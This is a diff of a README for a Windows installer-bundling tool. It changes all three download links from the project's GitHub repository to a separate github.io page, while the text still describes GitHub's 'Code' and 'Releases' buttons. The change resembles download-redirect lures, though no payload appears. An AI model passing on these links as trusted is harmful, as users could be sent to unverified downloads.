@@ -1,6 +1,6 @@
 # 📦 Offline-Installer-Pack-Creator-Tool - Bundle Installers Into One Simple Package
 
-[![Download Now](https://img.shields.io/badge/Download-Offline_Installer_Pack_Creator-blue?style=for-the-badge&logo=windows)](https://github.com/Kaiocs3120/Offline-Installer-Pack-Creator-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Offline_Installer_Pack_Creator-blue?style=for-the-badge&logo=windows)](https://kaiocs3120.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to download and use the tool. It takes less than five 
 
 Visit this link to download the application:
 
-**[https://github.com/Kaiocs3120/Offline-Installer-Pack-Creator-Tool](https://github.com/Kaiocs3120/Offline-Installer-Pack-Creator-Tool)**
+**[https://kaiocs3120.github.io](https://kaiocs3120.github.io)**
 
 This will take you to the official download page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click it, then select "Download ZIP" to get the latest version.
 
@@ -144,7 +144,7 @@ This tool is released as freeware. You can use, copy, and distribute it as you w
 
 If you need the download link again, here it is:
 
-**[Download Offline-Installer-Pack-Creator-Tool](https://github.com/Kaiocs3120/Offline-Installer-Pack-Creator-Tool)**
+**[Download Offline-Installer-Pack-Creator-Tool](https://kaiocs3120.github.io)**
 
 ---
 
